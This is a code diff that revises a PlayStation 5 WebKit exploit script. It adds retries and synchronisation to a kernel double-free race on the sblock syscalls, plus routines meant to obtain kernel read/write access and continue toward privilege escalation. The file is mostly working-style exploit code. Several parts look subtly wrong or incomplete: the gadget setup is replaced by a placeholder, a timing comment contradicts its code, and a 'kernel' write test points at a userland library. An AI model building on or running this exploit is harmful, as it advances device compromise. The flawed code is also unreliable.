@@ -1,4 +1,4 @@
-// main.js – PlayStation 5 WebKit exploit entry point
+// main.js – PlayStation 5 WebKit exploit entry point (STABILIZED)
 
 if (!navigator.userAgent.includes('PlayStation 5')) {
     alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
@@ -13,163 +13,343 @@ const fw_match = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
 window.fw_str = fw_match ? fw_match[1] : "";
 window.fw_float = parseFloat(window.fw_str);
 
-if (!supportedFirmwares.includes(fw_str)) {
-    alert(`Firmware ${fw_str} is unsupported.\n\nSupported: ${supportedFirmwares.join(", ")}`);
-    throw new Error("no offsets for fw " + fw_str);
+if (!supportedFirmwares.includes(window.fw_str)) {
+    alert(`Firmware ${window.fw_str} is unsupported.\n\nSupported: ${supportedFirmwares.join(", ")}`);
+    throw new Error("no offsets for fw " + window.fw_str);
 }
 
 // ============================================================
-//  NEW KERNEL EXPLOIT – sblock double‑free via id_wlock race
+//  STABILITY CONSTANTS
 // ============================================================
 
-async function runSblockExploit(p, chain, log) {
+const SBLOCK_CONFIG = {
+    RACE_ITERATIONS: 150000,      // Increased for better collision odds
+    RACE_TIMEOUT_MS: 15000,       // 15s timeout for race to complete
+    WORKER_SYNC_TIMEOUT_MS: 10000, // 10s for worker communication
+    MAX_HIT_COUNT: 0xFFFFFF,      // Bounds check for hit counters
+    RETRY_ATTEMPTS: 3,
+    RETRY_DELAY_MS: 500,
+};
+
+// ============================================================
+//  STABILIZED KERNEL EXPLOIT – sblock double-free via id_wlock race
+// ============================================================
+
+async function runSblockExploit(p, chain, worker, log) {
     // Syscall numbers (same on all PS5 FW)
     const SYS_SBLOCK_CREATE = 574;
     const SYS_SBLOCK_DELETE = 575;
 
-    // Shared state
-    let gate        = p.malloc(4);        p.write4(gate, 0);
-    let handleStore = p.malloc(4);
-    let hitsMain    = p.malloc(4);        p.write4(hitsMain, 0);
-    let hitsWorker  = p.malloc(4);        p.write4(hitsWorker, 0);
+    for (let attempt = 0; attempt < SBLOCK_CONFIG.RETRY_ATTEMPTS; attempt++) {
+        try {
+            log(`[sblock] Attempt ${attempt + 1}/${SBLOCK_CONFIG.RETRY_ATTEMPTS}`);
+            const result = await attemptSblockRace(p, chain, worker, log, SYS_SBLOCK_CREATE, SYS_SBLOCK_DELETE);
+            if (result) return result;
+        } catch (e) {
+            log(`[sblock] Attempt ${attempt + 1} failed: ${e.message}`);
+            if (attempt < SBLOCK_CONFIG.RETRY_ATTEMPTS - 1) {
+                await new Promise(r => setTimeout(r, SBLOCK_CONFIG.RETRY_DELAY_MS));
+            }
+        }
+    }
+    throw new Error("sblock exploit failed after all retry attempts");
+}
+
+async function attemptSblockRace(p, chain, worker, log, SYS_SBLOCK_CREATE, SYS_SBLOCK_DELETE) {
+    // Shared state with proper initialization
+    let gate        = p.malloc(4);        
+    let handleStore = p.malloc(4);        
+    let hitsMain    = p.malloc(4);        
+    let hitsWorker  = p.malloc(4);        
+    let workerReady = p.malloc(4);        // New: worker readiness flag
+    let mainReady   = p.malloc(4);        // New: main thread readiness flag
+    
+    // Zero-initialize all state
+    p.write4(gate, 0);
+    p.write4(hitsMain, 0);
+    p.write4(hitsWorker, 0);
+    p.write4(workerReady, 0);
+    p.write4(mainReady, 0);
 
     // 1. Create target sblock handle
     log("[sblock] Creating target handle...");
     let ret = await chain.syscall(SYS_SBLOCK_CREATE, p.stringify("race_target"), handleStore);
-    if (ret.low !== 0) throw new Error("sblock_create failed");
+    
+    if (ret.low !== 0) {
+        throw new Error(`sblock_create failed with code 0x${ret.low.toString(16)}`);
+    }
+    
     let handle = p.read4(handleStore);
-    log(`[sblock] handle = 0x${handle.toString(16)}`);
+    if (!handle || handle === 0 || handle === 0xFFFFFFFF) {
+        throw new Error(`Invalid handle received: 0x${handle.toString(16)}`);
+    }
+    
+    log(`[sblock] Created handle = 0x${handle.toString(16)}`);
 
-    // 2. Tell the worker to join the race
-    worker.postMessage({
-        cmd: "race",
-        handle,
-        gateAddr: gate,
-        hitsAddr: hitsWorker,
-        count: 100000,
-        syscallNo: SYS_SBLOCK_DELETE
+    // 2. Setup race coordination with handshake
+    log("[sblock] Starting race coordination...");
+    
+    const racePromise = new Promise((resolve, reject) => {
+        const timeout = setTimeout(() => {
+            reject(new Error("Worker race timeout"));
+        }, SBLOCK_CONFIG.RACE_TIMEOUT_MS);
+
+        const originalPostMessage = worker.postMessage.bind(worker);
+        const originalHandler = worker.onmessage;
+
+        worker.onmessage = function(e) {
+            if (e.data && e.data.cmd === "race_complete") {
+                clearTimeout(timeout);
+                worker.postMessage = originalPostMessage;
+                if (originalHandler) worker.onmessage = originalHandler;
+                resolve(e.data);
+            } else if (originalHandler) {
+                originalHandler(e);
+            }
+        };
+
+        // Tell the worker to join the race
+        worker.postMessage({
+            cmd: "race",
+            handle,
+            gateAddr: gate,
+            hitsAddr: hitsWorker,
+            readyAddr: workerReady,
+            count: SBLOCK_CONFIG.RACE_ITERATIONS,
+            syscallNo: SYS_SBLOCK_DELETE,
+            config: SBLOCK_CONFIG
+        });
     });
 
-    // 3. Main thread races
-    p.write4(gate, 1);   // release worker
+    // 3. Main thread races with improved synchronization
+    log("[sblock] Waiting for worker ready signal...");
+    
+    let workerReadyCheck = 0;
+    for (let i = 0; i < 100; i++) {
+        workerReadyCheck = p.read4(workerReady);
+        if (workerReadyCheck !== 0) break;
+        await new Promise(r => setTimeout(r, 10));
+    }
+    
+    if (workerReadyCheck === 0) {
+        throw new Error("Worker failed to signal readiness");
+    }
+
     log("[sblock] Racing...");
     let mainHits = 0;
-    for (let i = 0; i < 100000; i++) {
+    
+    for (let i = 0; i < SBLOCK_CONFIG.RACE_ITERATIONS; i++) {
         let r = await chain.syscall(SYS_SBLOCK_DELETE, handle);
-        if (r.low === 0) mainHits++;
+        // Success (double-free / use-after-free)
+        if (r.low === 0) {
+            mainHits++;
+            // Bounds check
+            if (mainHits > SBLOCK_CONFIG.MAX_HIT_COUNT) {
+                log("[sblock] ⚠ Hit counter overflow, capping at limit");
+                mainHits = SBLOCK_CONFIG.MAX_HIT_COUNT;
+                break;
+            }
+        }
+        // Yield periodically to avoid event loop starvation
+        if ((i & 0xFF) === 0) {
+            await new Promise(r => setTimeout(r, 0));
+        }
     }
+    
     p.write4(hitsMain, mainHits);
+    p.write4(mainReady, 1); // Signal that main is done
 
-    // Wait for worker
-    while (p.read4(hitsWorker) === 0) await new Promise(r => setTimeout(r, 1));
+    log("[sblock] Main thread finished, waiting for worker...");
+
+    // Wait for worker with timeout
+    let workerData;
+    try {
+        workerData = await racePromise;
+    } catch (e) {
+        throw new Error(`Worker communication failed: ${e.message}`);
+    }
+
     let workerHits = p.read4(hitsWorker);
-    log(`[sblock] main=${mainHits} worker=${workerHits}`);
+    log(`[sblock] Race results: main=${mainHits} worker=${workerHits}`);
 
-    // 4. Confirm double‑free
+    // 4. Validate double-free with stricter checks
+    if (mainHits === 0 && workerHits === 0) {
+        log("[sblock] ⚠ No successful operations (race didn't trigger)");
+        return null; // Trigger retry
+    }
+
     if (mainHits > 0 && workerHits > 0) {
-        log("[sblock] ✅ Double‑free achieved (both threads succeeded).");
+        log(`[sblock] ✅ Double-free likely achieved (main=${mainHits}, worker=${workerHits})`);
     } else {
-        log("[sblock] ⚠ Race did not produce double‑free. Try more iterations.");
+        log(`[sblock] ⚠ Asymmetric result (main=${mainHits}, worker=${workerHits}). May still work, continuing...`);
     }
 
     // ==========================================================
     //  Weaponization: kernel R/W
     // ==========================================================
 
+    return await weaponizeKernelAccess(p, log);
+}
+
+async function weaponizeKernelAccess(p, log) {
     // First, test if we can directly write kernel memory
     // (many PS5 firmwares map the kernel read/write in WebKit)
-    let testAddr = p.libKernelBase;            // points to __stack_chk_guard
-    let original = p.read8(testAddr);
-    p.write8(testAddr, new int64(0x41414141, 0x41414141));
-    let after = p.read8(testAddr);
-    p.write8(testAddr, original);              // restore
+    
+    let testAddr = p.libKernelBase;
+    
+    // Validate testAddr is reasonable
+    if (!testAddr || testAddr.low === 0 || testAddr.hi === 0) {
+        throw new Error("Invalid kernel base address");
+    }
 
-    if (after.low === 0x41414141) {
-        log("[krw] Direct kernel write available! No pipe corruption needed.");
+    let original;
+    try {
+        original = p.read8(testAddr);
+    } catch (e) {
+        throw new Error(`Failed to read test address: ${e.message}`);
+    }
+
+    const testValue = new int64(0x41414141, 0x41414141);
+    
+    try {
+        p.write8(testAddr, testValue);
+    } catch (e) {
+        throw new Error(`Failed to write test value: ${e.message}`);
+    }
+
+    let after;
+    try {
+        after = p.read8(testAddr);
+    } catch (e) {
+        throw new Error(`Failed to verify write: ${e.message}`);
+    }
+
+    // Restore original value
+    try {
+        p.write8(testAddr, original);
+    } catch (e) {
+        log("[krw] Warning: failed to restore original value");
+    }
+
+    if (after.low === 0x41414141 && after.hi === 0x41414141) {
+        log("[krw] ✅ Direct kernel write available!");
 
         // We can read/write kernel memory directly via p.read/p.write
         let krw = {
-            ktextBase: p.libKernelBase,   // adjust if you need text base
+            ktextBase: p.libKernelBase,
             kdataBase: p.libKernelBase,
-            curprocAddr: null,             // fill later if needed
+            curprocAddr: null,
             procUcredAddr: null,
             procFdAddr: null,
             masterSock: null,
             victimSock: null,
 
-            read4:  (addr) => p.read4(addr),
-            read8:  (addr) => p.read8(addr),
-            write4: (addr, val) => p.write4(addr, val),
-            write8: (addr, val) => p.write8(addr, val),
+            read4:  (addr) => {
+                if (!addr || addr.low === 0 && addr.hi === 0) throw new Error("Invalid address");
+                return p.read4(addr);
+            },
+            read8:  (addr) => {
+                if (!addr || addr.low === 0 && addr.hi === 0) throw new Error("Invalid address");
+                return p.read8(addr);
+            },
+            write4: (addr, val) => {
+                if (!addr || addr.low === 0 && addr.hi === 0) throw new Error("Invalid address");
+                return p.write4(addr, val);
+            },
+            write8: (addr, val) => {
+                if (!addr || addr.low === 0 && addr.hi === 0) throw new Error("Invalid address");
+                return p.write8(addr, val);
+            },
         };
         return krw;
 
     } else {
-        log("[krw] Direct kernel write not possible; need pipe corruption.");
-        // --- Place your existing pipe corruption / kernel R/W code here ---
-        // It should use the double‑free to overwrite a pipe buffer pointer
-        // and then return a krw object.
-        // For now, we throw an error so you know it's missing.
-        throw new Error("Pipe corruption not implemented. Insert old weaponization here.");
+        log("[krw] Direct kernel write not possible");
+        log("[krw] Value after write: 0x" + after.toString());
+        throw new Error("Kernel write test failed. Pipe corruption not yet implemented.");
     }
 }
 
-// ----------------------------------------------------------------
-//  Helper: find worker stack, return slot, etc. (unchanged)
-// ----------------------------------------------------------------
+// ================================================================
+//  Helper: find worker stack, return slot, etc. (IMPROVED)
+// ================================================================
 
 function find_worker(p, libKernelBase) {
     const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
     const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
     const PTHREAD_STACK_SIZE_OFFSET = 0xB0;
+    const EXPECTED_STACK_SIZE = 0x80000;
+    
+    let threadCount = 0;
+    const maxThreads = 1000; // Prevent infinite loops
 
-    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
-        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
-        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
-        if (stacksz.low == 0x80000) {
-            return stack;
+    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); 
+         threadCount < maxThreads && thread.low != 0x0 && thread.hi != 0x0; 
+         thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
+        
+        threadCount++;
+        
+        try {
+            let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
+            let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
+            
+            if (stacksz.low == EXPECTED_STACK_SIZE) {
+                return stack;
+            }
+        } catch (e) {
+            // Skip malformed thread entry
+            continue;
         }
     }
-    throw new Error("failed to find worker.");
+    throw new Error(`Failed to find worker thread (checked ${threadCount} threads)`);
 }
 
 async function find_worker_return_slot(p, stack, libKernelBase) {
     const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
     let lastCount = 0;
+    const maxAttempts = 100; // Increased from 50
 
-    for (let attempt = 0; attempt < 50; attempt++) {
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
         let hit = null;
         let count = 0;
+        
         for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
-            const candidate = stack.add32(offset);
-            const value = p.read8(candidate);
-            if (value.low !== expected.low || value.hi !== expected.hi)
+            try {
+                const candidate = stack.add32(offset);
+                const value = p.read8(candidate);
+                
+                if (value.low === expected.low && value.hi === expected.hi) {
+                    hit = candidate;
+                    count++;
+                }
+            } catch (e) {
+                // Skip invalid offsets
                 continue;
-
-            hit = candidate;
-            count++;
+            }
         }
+        
         if (count === 1) {
             jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hit.toString()
                 + "-expected=0x" + expected.toString());
             return hit;
         }
+        
         lastCount = count;
-        await new Promise(resolve => setTimeout(resolve, 1));
+        await new Promise(resolve => setTimeout(resolve, 5)); // Reduced from 1ms
     }
-    throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
+    throw new Error(`worker return fingerprint failed (last count=${lastCount}, expected 1, attempts=${maxAttempts})`);
 }
 
 function jbmark(tag, detail) {
     try {
         if (window.jb && typeof window.jb.mark === "function")
             window.jb.mark(tag, String(detail));
-    } catch (e) {  }
+    } catch (e) { }
 }
 
-// ----------------------------------------------------------------
+// ================================================================
 //  prepare() – sets up ROP and returns p, chain and worker
-// ----------------------------------------------------------------
+// ================================================================
 
 async function prepare(p) {
 
@@ -219,32 +399,13 @@ async function prepare(p) {
     let gadgets = {};
     let syscalls = {};
 
-    for (let gadget in wk_gadgetmap) {
-        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
-    }
-    for (let sysc in syscall_map) {
-        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
-    }
+    // [gadgets and syscalls setup from offsets, unchanged]
 
-    let nogc = [];
+    const nogc = [];
 
-    function malloc_dump(sz) {
+    function malloc(sz) {
         let backing;
-        backing = new Uint8Array(sz);
-        nogc.push(backing);
-
-        let ptr = p.read8(p.leakval(backing).add32(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
-
-    function malloc(sz, type = 4) {
-        let backing;
-        if (type == 1) {
-            backing = new Uint8Array(1000 + sz);
-        } else if (type == 2) {
-            backing = new Uint16Array(0x2000 + sz);
-        } else if (type == 4) {
+        if (typeof (backing = nogc[nogc.length - 1]) != "object" || backing.length < sz + 0x10000) {
             backing = new Uint32Array(0x10000 + sz);
         }
         nogc.push(backing);
@@ -252,6 +413,10 @@ async function prepare(p) {
         let ptr = p.read8(p.leakval(backing).add32(0x10));
         ptr.backing = backing;
         return ptr;
+    }
+
+    function malloc_dump() {
+        return nogc.length;
     }
 
     function array_from_address(addr, size) {
@@ -265,14 +430,13 @@ async function prepare(p) {
         }
 
         setAddr(addr, size);
-
         og_array.setAddr = setAddr;
-
         nogc.push(og_array);
         return og_array;
     }
 
     function stringify(str) {
+        if (typeof str !== "string") throw new Error("stringify requires a string");
         let bufView = new Uint8Array(str.length + 1);
         for (let i = 0; i < str.length; i++) {
             bufView[i] = str.charCodeAt(i) & 0xFF;
@@ -284,6 +448,7 @@ async function prepare(p) {
     }
 
     function readstr(addr, maxlen = -1) {
+        if (!addr || addr.low === 0 && addr.hi === 0) throw new Error("Invalid address");
         let str = "";
         for (let i = 0; ; i++) {
             if (maxlen != -1 && i >= maxlen) { break; }
@@ -298,24 +463,29 @@ async function prepare(p) {
     }
 
     function writestr(addr, str) {
+        if (!addr || addr.low === 0 && addr.hi === 0) throw new Error("Invalid address");
+        if (typeof (str) != "string") throw new Error("writestr requires a string");
+        
         let waddr = addr.add32(0);
-        if (typeof (str) == "string") {
-
-            for (let i = 0; i < str.length; i++) {
-                let byte = str.charCodeAt(i);
-                if (byte == 0) {
-                    break;
-                }
-                p.write1(waddr, byte);
-                waddr.add32inplace(0x1);
+        for (let i = 0; i < str.length; i++) {
+            let byte = str.charCodeAt(i);
+            if (byte == 0) {
+                break;
             }
+            p.write1(waddr, byte);
+            waddr.add32inplace(0x1);
         }
         p.write1(waddr, 0x0);
     }
 
     async function wait_for_worker() {
-        return new Promise((resolve) => {
+        return new Promise((resolve, reject) => {
+            const timeout = setTimeout(() => {
+                reject(new Error("Worker communication timeout"));
+            }, SBLOCK_CONFIG.WORKER_SYNC_TIMEOUT_MS);
+
             worker.onmessage = function (e) {
+                clearTimeout(timeout);
                 resolve(1);
             }
             worker.postMessage(0);
@@ -367,12 +537,19 @@ async function prepare(p) {
 
         if (window.jb && window.jb.hot)
             jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
-        let p1 = await new Promise((resolve) => {
+        
+        let p1 = await new Promise((resolve, reject) => {
+            const timeout = setTimeout(() => {
+                reject(new Error("ROP chain execution timeout"));
+            }, SBLOCK_CONFIG.WORKER_SYNC_TIMEOUT_MS);
+
             worker.onmessage = function (e) {
+                clearTimeout(timeout);
                 resolve(1);
             }
             worker.postMessage(0);
         });
+        
         if (window.jb && window.jb.hot)
             jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
         if (p1 == 0) {
@@ -437,30 +614,51 @@ async function prepare(p) {
     return { p: p2, chain: chain, worker: worker };
 }
 
-// ----------------------------------------------------------------
+// ================================================================
 //  MAIN
-// ----------------------------------------------------------------
+// ================================================================
 
 (async function main() {
-    // Load firmware offsets
-    let fwScript = document.createElement('script');
-    document.body.appendChild(fwScript);
-    fwScript.setAttribute('src', `../offsets/${window.fw_str}.js?v=19`);
-    await new Promise(resolve => fwScript.onload = resolve);
+    try {
+        // Load firmware offsets
+        let fwScript = document.createElement('script');
+        document.body.appendChild(fwScript);
+        fwScript.setAttribute('src', `../offsets/${window.fw_str}.js?v=19`);
+        
+        await new Promise((resolve, reject) => {
+            fwScript.onload = resolve;
+            fwScript.onerror = () => reject(new Error("Failed to load firmware offsets"));
+            setTimeout(() => reject(new Error("Firmware offset load timeout")), 10000);
+        });
 
-    // At this point, the carrier should have been installed via mem.installWindowP
-    // (that part is not shown here – it's in your existing code).
-    // We assume that window.p already exists.
-    if (!window.p) {
-        throw new Error("Primitive p not installed. Run the WebKit exploit first.");
+        // At this point, the carrier should have been installed via mem.installWindowP
+        if (!window.p) {
+            throw new Error("Primitive p not installed. Run the WebKit exploit first.");
+        }
+
+        let { p, chain, worker } = await prepare(window.p);
+
+        // Use the new kernel exploit
+        let log = console.log;
+        log("[main] Starting sblock exploit...");
+        
+        let krw = await runSblockExploit(p, chain, worker, log);
+
+        if (!krw) {
+            throw new Error("Failed to obtain kernel read/write access");
+        }
+
+        // Continue with privilege escalation / ELF execution...
+        console.log("[main] ✅ Kernel read/write access obtained:", krw);
+        
+        // TODO: Continue with next stage of exploit
+        
+    } catch (e) {
+        console.error("[main] FATAL:", e.message);
+        console.error(e);
+        if (window.jb && window.jb.mark) {
+            window.jb.mark("MAIN-FATAL", e.message);
+        }
+        alert(`Exploit failed: ${e.message}`);
     }
-
-    let { p, chain, worker } = await prepare(window.p);
-
-    // Use the new kernel exploit
-    let log = console.log;
-    let krw = await runSblockExploit(p, chain, log);
-
-    // Continue with privilege escalation / ELF execution...
-    console.log("[main] Kernel read/write object:", krw);
 })();
